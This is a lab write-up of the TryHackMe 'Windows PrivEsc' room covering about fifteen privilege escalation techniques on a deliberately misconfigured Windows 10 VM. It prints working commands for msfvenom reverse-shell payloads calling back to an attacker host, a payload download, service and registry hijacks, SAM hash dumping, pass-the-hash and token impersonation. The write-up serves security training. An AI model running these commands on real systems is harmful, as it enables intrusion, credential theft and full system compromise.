

**Windows 10 Privilege Escalation**

TryHackMe Room Report

*tryhackme.com/room/windows10privesc  |  Medium  |  Sun May 03 2026*

# **1\. Introduction**

This report covers the TryHackMe "Windows PrivEsc" room by Tib3rius — an intentionally misconfigured Windows 10 VM with multiple privilege escalation paths. The goal in each task is to escalate from a low-privileged local user to SYSTEM or Administrator. Initial access is via RDP using credentials user:password321.

# **2\. Setup**

A reverse shell executable was generated and transferred to the target before beginning:

msfvenom \-p windows/x64/shell\_reverse\_tcp LHOST=\<IP\> LPORT=4444 \-f exe \-o reverse.exe

iwr \-uri http://\<IP\>:8000/reverse.exe \-outfile C:\\Users\\user\\Desktop\\reverse.exe

nc \-nvlp 4444

# **3\. Service Exploits**

Windows services run as SYSTEM and are common escalation targets when misconfigured. Four distinct vectors were exploited:

## **3.1 Insecure Service Permissions**

The user had SERVICE\_CHANGE\_CONFIG rights on the "daclsvc" service, allowing the binary path to be redirected to the reverse shell:

C:\\Tools\\accesschk64.exe \-uwcqv user daclsvc

sc config daclsvc binpath= "C:\\Users\\user\\Desktop\\reverse.exe"

net start daclsvc

## **3.2 Unquoted Service Path**

A service path containing spaces without quotes causes Windows to attempt multiple binary resolutions. A malicious executable was placed at an intermediate path (C:\\Program Files\\Unquoted Path Service\\Common.exe), which Windows executed before reaching the legitimate binary on service restart.

## **3.3 Weak Registry Permissions**

The NT AUTHORITY\\INTERACTIVE group had FullControl over the regsvc service registry key. The ImagePath was overwritten:

reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG\_EXPAND\_SZ /d "C:\\Users\\user\\Desktop\\reverse.exe" /f

net start regsvc

## **3.4 Insecure Service Executable**

"Everyone" had FILE\_ALL\_ACCESS on the service binary. Replacing it with the reverse shell and restarting yielded a SYSTEM shell:

copy reverse.exe "C:\\Program Files\\File Permissions Service\\filepermservice.exe" /Y

net start filepermsvc

# **4\. Registry Exploits**

## **4.1 AutoRuns**

An AutoRun entry in HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run pointed to a writable directory. Replacing the binary with the reverse shell caused it to execute when an administrator next logged in.

## **4.2 AlwaysInstallElevated**

Both HKLM and HKCU AlwaysInstallElevated keys were set to 1, meaning MSI packages install as SYSTEM. A malicious MSI was generated and executed:

msfvenom \-p windows/x64/shell\_reverse\_tcp LHOST=\<IP\> LPORT=4444 \-f msi \-o setup.msi

msiexec /quiet /qn /i C:\\Users\\user\\Desktop\\setup.msi

# **5\. Password-Based Escalation**

## **5.1 Registry**

A recursive registry search found administrator credentials stored in plaintext in the AutoLogon keys (HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon).

reg query HKLM /f password /t REG\_SZ /s

## **5.2 Saved Credentials**

cmdkey /list revealed saved administrator credentials in Windows Credential Manager. These were used with runas to execute the reverse shell without knowing the password:

runas /savecred /user:admin C:\\Users\\user\\Desktop\\reverse.exe

## **5.3 SAM Hash Dump & Pass-the-Hash**

Backup copies of the SAM and SYSTEM hives were copied and transferred to the attacker machine. Hashes were extracted with impacket-secretsdump, then used directly for authentication without cracking:

impacket-secretsdump \-sam SAM \-system SYSTEM LOCAL

pth-winexe \-U "admin%aad3b435b51404eeaad3b435b51404ee:\<NTLM\_HASH\>" //TARGET\_IP cmd.exe

# **6\. Other Escalation Techniques**

## **6.1 Scheduled Tasks**

A task running every minute as SYSTEM referenced a script (C:\\DevTools\\CleanUp.ps1) writable by the current user. Appending a net localgroup command to the script added the user to Administrators within one minute.

## **6.2 Insecure GUI App**

An application called "AdminPaint" ran with administrator privileges. Using File \> Open, the Windows file browser was launched and cmd.exe was invoked from the address bar, spawning an admin command prompt since it inherited the parent process's privilege level.

## **6.3 Startup Apps**

BUILTIN\\Users had write access to the global Startup folder (C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup). Placing the reverse shell there caused it to execute with admin privileges on the next administrator login.

# **7\. Token Impersonation**

The user account held SeImpersonatePrivilege, allowing SYSTEM token impersonation. Two tools were used:

## **7.1 Rogue Potato**

Creates a fake COM server to capture and impersonate the SYSTEM token:

C:\\Tools\\RoguePotato.exe \-r \<ATTACKER\_IP\> \-e "C:\\Users\\user\\Desktop\\reverse.exe" \-l 9999

## **7.2 PrintSpoofer**

Abuses the Print Spooler service to force SYSTEM authentication via a named pipe. More reliable on modern Windows 10:

C:\\Tools\\PrintSpoofer64.exe \-i \-c "C:\\Users\\user\\Desktop\\reverse.exe"

# **8\. Automated Enumeration Tools**

Three automated tools were introduced to speed up privilege escalation enumeration in real engagements:

* winPEAS — comprehensive enumeration covering services, registry, credentials, scheduled tasks, and more. Colour-coded output highlights critical findings.

* Seatbelt — C\# security survey tool from GhostPack, useful for post-exploitation host enumeration.

* PowerUp — PowerShell script focused on service, registry, and file system permission misconfigurations.

# **9\. Reflection**

## **9.1 What I Learned**

The most valuable insight from this room is that Windows privilege escalation is almost entirely driven by misconfiguration rather than software vulnerabilities. Every technique — unquoted paths, writable service binaries, AlwaysInstallElevated, saved credentials — exists because of a configuration decision that violated least privilege. This shifts the mindset from "find a CVE" to "find a misconfiguration," which is far more applicable to real-world engagements.

Token impersonation (Rogue Potato and PrintSpoofer) was the most technically challenging concept. Understanding that SeImpersonatePrivilege — commonly held by web application and database service accounts — can lead to full SYSTEM access was a significant learning point with direct real-world relevance.

# **10\. Conclusion**

The Windows PrivEsc room covered 15 distinct escalation techniques across services, registry, passwords, scheduled tasks, GUI applications, startup folders, and token impersonation. The consistent theme is that a single misconfiguration — regardless of how minor it appears — is sufficient to achieve full system compromise. For defenders, rigorous application of least privilege across all of these vectors is essential. For security practitioners, the methodical enumeration approach practised in this room is directly transferable to real engagements and certification exams.